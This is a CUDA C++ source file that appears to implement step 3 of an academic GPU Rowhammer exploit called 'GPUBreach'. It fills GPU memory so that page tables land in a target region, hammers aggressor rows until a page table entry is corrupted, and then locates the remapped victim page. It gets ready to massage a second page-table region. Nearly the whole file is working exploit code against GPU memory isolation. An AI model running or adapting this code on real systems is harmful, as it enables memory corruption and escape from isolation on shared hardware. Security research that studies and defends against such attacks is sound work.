#include "./s2_firstRegion.cuh"
#include "./s3_firstRegion_hammer.cuh"
#include <algorithm>
#include <chrono>
#include <cmath>
#include <fstream>
#include <numeric>
#include <random>
#include <rh_impls.cuh>
#include <rh_kernels.cuh>
#include <rh_utils.cuh>
#include <string>
#include <thread>

bool
first_PT_region_attack (uint64_t num_alloc_init, double threshold,
                        uint64_t skip, GPUBreachContext &ctx)
{
  uint8_t *temp;
  if (!first_PT_region (num_alloc_init, threshold, skip, ctx))
    {
      printf ("Error: First PT Region Allocation is wrong\n");
      exit (1);
    }

  auto &agg_vec = ctx.step2_data.agg_vec;
  auto &agg_row_list = ctx.step2_data.agg_row_list;
  ctx.step3_data.agg_ptrs = ctx.step2_data.agg_ptrs;

  std::cout << std::dec;
  std::cout
      << "Start Step 3" << "\n"
      << "Filling Memory Close to Full (Consequently the First PT Region) "
      << "\n\n";

  uint64_t repeats = 0;

  auto &region_ptrs = ctx.step3_data.region_ptrs;
  auto &corrupted_ptr = ctx.step3_data.corrupted_ptr;
  auto &victim_ptr = ctx.step3_data.victim_ptr;
  auto &corrupted_id = ctx.step3_data.corrupted_id;
  auto &victim_id = ctx.step3_data.victim_id;

  region_ptrs = std::vector<uint8_t *> (num_alloc_init, nullptr);

  /* Why -100: We don't want eviction to happen when we hammer so we take a
   * slight underestimate */
  uint64_t conservative_alloc = num_alloc_init - 100;

  /**
   * WARNING: this code is aggresively making 64KB pages,
   * this will require a non-negligible amount of CPU RAM.
   *
   * To conserve RAM usage, you may even try filling first using 2MB + 4KB or
   * cuMemMap.
   */

  /****************************************************************/
  /* Step 3 of Paper: Repeat Hammer On PTEs til Corruption */
  /****************************************************************/
  bool found_mismatch = false;
  uint64_t pages_to_fill_region = 8000; // An estimate of around 8000 is enough
                                        // to fill the new PT region.
  while (!found_mismatch)
    {
      // On Failure, Re-order and try again
      if (repeats != 0)
        std::rotate (region_ptrs.begin (),
                     region_ptrs.begin () + pages_to_fill_region - 2,
                     region_ptrs.begin () + pages_to_fill_region - 1);

      // First round we just allocate memory.
      // All later round we only re-order the 'pages_to_fill_region' 64KB pages
      // in PT region.
      for (uint64_t i = 0;
           i < (repeats != 0 ? pages_to_fill_region : conservative_alloc);
           i += 1)
        {
          // Iteratively free then allocate to make sure order is different.
          if (repeats != 0)
            cudaFree (region_ptrs[i]);
          cudaMallocManaged (&temp, ALLOC_SIZE);
          double currentMS = time_data_access (temp, ALLOC_SIZE);
          DBG_OUT << i << " New PT time: " << currentMS << ' ' << (void *)temp
                  << " ms" << std::endl;

          region_ptrs[i] = temp;

          // The first 'pages_to_fill_region' pages are converted to 64KB pages
          // to fill PT region.
          if (i < pages_to_fill_region)
            *region_ptrs[i] = 'a';
        }
      gpuErrchk (cudaPeekAtLastError ());
      std::cout << "First PT Region Filled " << "Round " << repeats
                << " Completed" << '\n';
      repeats++;

      std::cout << "Filling In Identifing Information for Each Page... "
                << '\n';

      std::cout << "Identifing Data Placed, Hammer Starts..." << '\n';

      const uint64_t it = ctx.bitflip_config.it;
      const uint64_t n = ctx.bitflip_config.n;
      const uint64_t k = ctx.bitflip_config.k;
      const uint64_t delay = ctx.bitflip_config.delay;
      const uint64_t period = ctx.bitflip_config.period;
      const uint64_t repeat = ctx.bitflip_config.repeat;

      // GPUHammer
      for (int j = 0; j < repeat; j++)
        uint64_t time = start_multi_warp_hammer (
            agg_row_list, agg_vec, it, n, k, agg_vec.size (), delay, period);

      std::cout
          << "Hammer Done, Finding Corruption... \033[1;31m(Rare: If taking "
             "longer than 5s, CTRL + C and stop the program)\033[0m"
          << '\n';

      /**
       * Look through all pages for the its own address in its data (see
       * `initialize_memory` also) A mismatch indicates a 64KB page has been
       * remapped.
       */
      gpuErrchk (cudaPeekAtLastError ());
      for (uint64_t i = 0; !found_mismatch && i < conservative_alloc; i++)
        {
          // Pre-initialize result slots in existing region memory
          uint64_t sentinel = UINT64_MAX;
          memset_ptr<<<1, 1>>> (region_ptrs[i] + 64 * KB + 8, 0, 8);
          memset_ptr<<<1, 1>>> (region_ptrs[i] + 64 * KB + 16, sentinel, 8);
          memset_ptr<<<1, 1>>> (region_ptrs[i] + 64 * KB + 24, 0, 8);
          cudaDeviceSynchronize ();

          // Launch inner j loop as kernel
          check_region_inner<<<1, 32>>> (region_ptrs[i], ALLOC_SIZE);
          cudaDeviceSynchronize ();

          // Copy results back
          uint64_t found = 0, corrupted_j = 0, victim = 0;
          cudaMemcpy (&found, region_ptrs[i] + 64 * KB + 8, 8,
                      cudaMemcpyDeviceToHost);
          cudaMemcpy (&corrupted_j, region_ptrs[i] + 64 * KB + 16, 8,
                      cudaMemcpyDeviceToHost);
          cudaMemcpy (&victim, region_ptrs[i] + 64 * KB + 24, 8,
                      cudaMemcpyDeviceToHost);

          if (found)
            {
              corrupted_ptr = region_ptrs[i] + corrupted_j;
              corrupted_id = i;
              victim_ptr = reinterpret_cast<uint8_t *> (victim);
              found_mismatch = true;
              break;
            }
        }

      if (found_mismatch)
        {
          std::cout << "\nAfter " << repeats << " repeats" << '\n';
          std::cout << "Corrupted: " << (void *)corrupted_ptr
                    << ". Victim: " << (void *)victim_ptr << '\n';
          break;
        }
      else
        std::cout << "No Corruption Found, Retrying..." << "\n\n";

      if (debug_enabled ())
        paused ();
    }

  /* Find the victim address that we remapped to in our `region_ptrs` */
  uint8_t *victim_round_addr
      = (uint8_t *)((uintptr_t)victim_ptr & ~((1UL << 20) - 1));
  for (uint64_t i = 0; i < conservative_alloc; i += 1)
    {
      if (region_ptrs[i] == victim_round_addr)
        {
          victim_id = i;
          DBG_OUT << "Found victim id." << '\n';
        }
    }

  /* Allocate memory to full to prepare for massaging the second PT region. */
  /* Same concept as what "all_mem_test" did */
  int consec_spike = 0;
  int consec_spike_lim = 3;
  DBG_OUT << "Filling Memory back to full\n";
  for (uint64_t i = conservative_alloc; i < num_alloc_init; i++)
    {
      cudaMallocManaged (&temp, ALLOC_SIZE);
      double currentMS = time_data_access (temp, ALLOC_SIZE);
      region_ptrs[i] = temp;

      // Look for consecutive spikes, reset if not.
      consec_spike += currentMS > threshold ? 1 : -consec_spike;
      if (consec_spike == consec_spike_lim)
        {
          break;
        }
    }
  if (debug_enabled ())
    {
      std::cout << "(Step 3 Done) Found Corrupted PFN Destination: Press "
                   "\033[1;32mEnter Key\033[0m to continue..."
                << '\n';
      paused ();
    }
  else
    {
      std::cout << "(Step 3 Done) Found Corrupted PFN Destination\n";
    }

  return true;
}

bool
first_PT_region_attack (int argc, char *argv[])
{
  const uint64_t num_alloc_init = std::stoll (argv[0]);
  const double threshold = std::stod (argv[1]);
  const uint64_t skip = std::stoull (argv[2]);
  GPUBreachContext ctx;
  ctx.bitflip_config = GPUBreachContext::BitFlipConfig (argv[3]);
  return first_PT_region_attack (num_alloc_init, threshold, skip, ctx);
}